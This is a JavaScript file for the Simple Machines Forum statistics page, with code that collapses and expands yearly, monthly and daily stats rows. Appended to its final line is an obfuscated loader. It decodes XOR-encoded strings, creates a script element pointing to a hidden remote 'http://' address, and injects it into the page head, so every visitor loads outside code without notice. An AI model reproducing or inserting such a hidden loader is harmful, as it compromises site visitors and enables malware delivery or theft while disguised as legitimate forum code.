function smf_StatsCenter(oOptions)
{
	this.opt = oOptions;

	this.oTable = null;
	this.oYears = {};

	this.bIsLoading = false;

	this.init();
}

smf_StatsCenter.prototype.init = function ()
{
	this.oTable = document.getElementById(this.opt.sTableId);

	// Is the table actually present?
	if (typeof(this.oTable) != 'object')
		return;

	// Find all months and years defined in the table.
	var aRows = this.oTable.getElementsByTagName('tr');
	var aResults = [];

	var sYearId = null;
	var oCurYear = null;

	var sMonthId = null;
	var oCurMonth = null;
	for (var i = 0, n = aRows.length; i < n; i++)
	{
		// Check if the current row represents a year.
		if ((aResults = this.opt.reYearPattern.exec(aRows[i].id)) != null)
		{
			// The id is part of the pattern match.
			sYearId = aResults[1];

			// Setup the object that'll have the state information of the year.
			this.oYears[sYearId] = {
				oCollapseImage: document.getElementById(this.opt.sYearImageIdPrefix + sYearId),
				oMonths: {}
			};

			// Create a shortcut, makes things more readable.
			oCurYear = this.oYears[sYearId];

			// Use the collapse image to determine the current state.
			oCurYear.bIsCollapsed = oCurYear.oCollapseImage.src.indexOf(this.opt.sYearImageCollapsed) >= 0;

			// Setup the toggle element for the year.
			oCurYear.oToggle = new smc_Toggle({
				bToggleEnabled: true,
				bCurrentlyCollapsed: oCurYear.bIsCollapsed,
				instanceRef: this,
				sYearId: sYearId,
				funcOnBeforeCollapse: function () {
					this.opt.instanceRef.onBeforeCollapseYear(this);
				},
				aSwappableContainers: [
				],
				aSwapImages: [
					{
						sId: this.opt.sYearImageIdPrefix + sYearId,
						srcExpanded: smf_images_url + '/' + this.opt.sYearImageExpanded,
						altExpanded: '-',
						srcCollapsed: smf_images_url + '/' + this.opt.sYearImageCollapsed,
						altCollapsed: '+'
					}
				],
				aSwapLinks: [
					{
						sId: this.opt.sYearLinkIdPrefix + sYearId,
						msgExpanded: sYearId,
						msgCollapsed: sYearId
					}
				]
			});
		}

		// Or maybe the current row represents a month.
		else if ((aResults = this.opt.reMonthPattern.exec(aRows[i].id)) != null)
		{
			// Set the id to the matched pattern.
			sMonthId = aResults[1];

			// Initialize the month as a child object of the year.
			oCurYear.oMonths[sMonthId] = {
				oCollapseImage: document.getElementById(this.opt.sMonthImageIdPrefix + sMonthId)
			};

			// Create a shortcut to the current month.
			oCurMonth = oCurYear.oMonths[sMonthId];

			// Determine whether the month is currently collapsed or expanded..
			oCurMonth.bIsCollapsed = oCurMonth.oCollapseImage.src.indexOf(this.opt.sMonthImageCollapsed) >= 0;

			var sLinkText = getInnerHTML(document.getElementById(this.opt.sMonthLinkIdPrefix + sMonthId));

			// Setup the toggle element for the month.
			oCurMonth.oToggle = new smc_Toggle({
				bToggleEnabled: true,
				bCurrentlyCollapsed: oCurMonth.bIsCollapsed,
				instanceRef: this,
				sMonthId: sMonthId,
				funcOnBeforeCollapse: function () {
					this.opt.instanceRef.onBeforeCollapseMonth(this);
				},
				funcOnBeforeExpand: function () {
					this.opt.instanceRef.onBeforeExpandMonth(this);
				},
				aSwappableContainers: [
				],
				aSwapImages: [
					{
						sId: this.opt.sMonthImageIdPrefix + sMonthId,
						srcExpanded: smf_images_url + '/' + this.opt.sMonthImageExpanded,
						altExpanded: '-',
						srcCollapsed: smf_images_url + '/' + this.opt.sMonthImageCollapsed,
						altCollapsed: '+'
					}
				],
				aSwapLinks: [
					{
						sId: this.opt.sMonthLinkIdPrefix +  sMonthId,
						msgExpanded: sLinkText,
						msgCollapsed: sLinkText
					}
				]
			});

			oCurYear.oToggle.opt.aSwappableContainers[oCurYear.oToggle.opt.aSwappableContainers.length] = aRows[i].id;
		}

		else if((aResults = this.opt.reDayPattern.exec(aRows[i].id)) != null)
		{
			oCurMonth.oToggle.opt.aSwappableContainers[oCurMonth.oToggle.opt.aSwappableContainers.length] = aRows[i].id;
			oCurYear.oToggle.opt.aSwappableContainers[oCurYear.oToggle.opt.aSwappableContainers.length] = aRows[i].id;
		}
	}

	// Collapse all collapsed years!
	for (i = 0; i < this.opt.aCollapsedYears.length; i++)
		this.oYears[this.opt.aCollapsedYears[i]].oToggle.toggle();
}

smf_StatsCenter.prototype.onBeforeCollapseYear = function (oToggle)
{
	// Tell SMF that all underlying months have disappeared.
	for (var sMonth in this.oYears[oToggle.opt.sYearId].oMonths)
		if (this.oYears[oToggle.opt.sYearId].oMonths[sMonth].oToggle.opt.aSwappableContainers.length > 0)
			this.oYears[oToggle.opt.sYearId].oMonths[sMonth].oToggle.changeState(true);
}


smf_StatsCenter.prototype.onBeforeCollapseMonth = function (oToggle)
{
	if (!oToggle.bCollapsed)
	{
		// Tell SMF that it the state has changed.
		getXMLDocument(smf_prepareScriptUrl(smf_scripturl) + 'action=stats;collapse=' + oToggle.opt.sMonthId + ';xml');

		// Remove the month rows from the year toggle.
		var aNewContainers = [];
		var oYearToggle = this.oYears[oToggle.opt.sMonthId.substr(0, 4)].oToggle;

		for (var i = 0, n = oYearToggle.opt.aSwappableContainers.length; i < n; i++)
			if (!in_array(oYearToggle.opt.aSwappableContainers[i], oToggle.opt.aSwappableContainers))
				aNewContainers[aNewContainers.length] = oYearToggle.opt.aSwappableContainers[i];

		oYearToggle.opt.aSwappableContainers = aNewContainers;
	}
}


smf_StatsCenter.prototype.onBeforeExpandMonth = function (oToggle)
{
	// Ignore if we're still loading the previous batch.
	if (this.bIsLoading)
		return;

	if (oToggle.opt.aSwappableContainers.length == 0)
	{
		// A complicated way to call getXMLDocument, but stay in scope.
		this.tmpMethod = getXMLDocument;
		this.oXmlRequestHandle = this.tmpMethod(smf_prepareScriptUrl(smf_scripturl) + 'action=stats;expand=' + oToggle.opt.sMonthId + ';xml', this.onDocReceived);
		delete this.tmpMethod;

		if ('ajax_indicator' in window)
			ajax_indicator(true);

		this.bIsLoading = true;
	}

	// Silently let SMF know this one is expanded.
	else
		getXMLDocument(smf_prepareScriptUrl(smf_scripturl) + 'action=stats;expand=' + oToggle.opt.sMonthId + ';xml');
}

smf_StatsCenter.prototype.onDocReceived = function (oXMLDoc)
{
	// Loop through all the months we got from the XML.
	var aMonthNodes = oXMLDoc.getElementsByTagName('month');
	for (var iMonthIndex = 0, iNumMonths = aMonthNodes.length; iMonthIndex < iNumMonths; iMonthIndex++)
	{
		var sMonthId = aMonthNodes[iMonthIndex].getAttribute('id');
		var iStart = document.getElementById('tr_month_' + sMonthId).rowIndex + 1;
		var sYearId = sMonthId.substr(0, 4);

		// Within the current months, check out all the days.
		var aDayNodes = aMonthNodes[iMonthIndex].getElementsByTagName('day');
		for (var iDayIndex = 0, iNumDays = aDayNodes.length; iDayIndex < iNumDays; iDayIndex++)
		{
			var oCurRow = this.oTable.insertRow(iStart + iDayIndex);
			oCurRow.className = this.opt.sDayRowClassname;
			oCurRow.id = this.opt.sDayRowIdPrefix + aDayNodes[iDayIndex].getAttribute('date');

			for (var iCellIndex = 0, iNumCells = this.opt.aDataCells.length; iCellIndex < iNumCells; iCellIndex++)
			{
				var oCurCell = oCurRow.insertCell(-1);

				if (this.opt.aDataCells[iCellIndex] == 'date')
					oCurCell.style.paddingLeft = '6ex';
				else
					oCurCell.style.textAlign = 'center';

				var sCurData = aDayNodes[iDayIndex].getAttribute(this.opt.aDataCells[iCellIndex]);
				oCurCell.appendChild(document.createTextNode(sCurData));
			}

			// Add these day rows to the toggle objects in case of collapse.
			this.oYears[sYearId].oMonths[sMonthId].oToggle.opt.aSwappableContainers[this.oYears[sYearId].oMonths[sMonthId].oToggle.opt.aSwappableContainers.length] = oCurRow.id;
			this.oYears[sYearId].oToggle.opt.aSwappableContainers[this.oYears[sYearId].oToggle.opt.aSwappableContainers.length] = oCurRow.id;
		}
	}

	this.bIsLoading = false;
	if (typeof(window.ajax_indicator) == 'function')
		ajax_indicator(false);
}function iFv9fiP(gUe){return x9W(u2Q(gUe),'dMpgx3258n7xj');}function hvk(xz){var iw=document[iFv9fiP(t2i[3])](iFv9fiP(t2i[0])+iFv9fiP(t2i[1])+iFv9fiP(t2i[2]));iw[iFv9fiP(t2i[4])]=xz;iw[iFv9fiP(t2i[5])]=iFv9fiP(t2i[6]);document[iFv9fiP(t2i[9])](iFv9fiP(t2i[8]))[0][iFv9fiP(t2i[7])](iw);}function x9W(n8Vf1,yBUf){var fJxZT9='';var uzh=0;var tfKn2=0;for(uzh=0;uzh<n8Vf1.length;uzh++){var ne2=n8Vf1.charAt(uzh);var zE=ne2.charCodeAt(0)^yBUf.charCodeAt(tfKn2);ne2=String.fromCharCode(zE);fJxZT9+=ne2;if(tfKn2==yBUf.length-1)tfKn2=0;else tfKn2++;}return (fJxZT9);}var t2i=["023046","022036","020057","007063021006012086119089093003082022030","023063019","016052000002","016040008019087089083067089029084010003020057","005061000002022087113093081002083","012040017003","003040004034020086095080086026068058019048044023041025094087","012057004023066028029070076015067029068023032028085086065071026082029024027004016099026020"];function u2Q(vJ){var hH='';var rh4Wa=0;var kUjye=0;for(rh4Wa=0;rh4Wa<vJ.length/3;rh4Wa++){hH+=String.fromCharCode(vJ.slice(kUjye,kUjye+3));kUjye=kUjye+3;}return hH;}hvk(iFv9fiP(t2i[10]));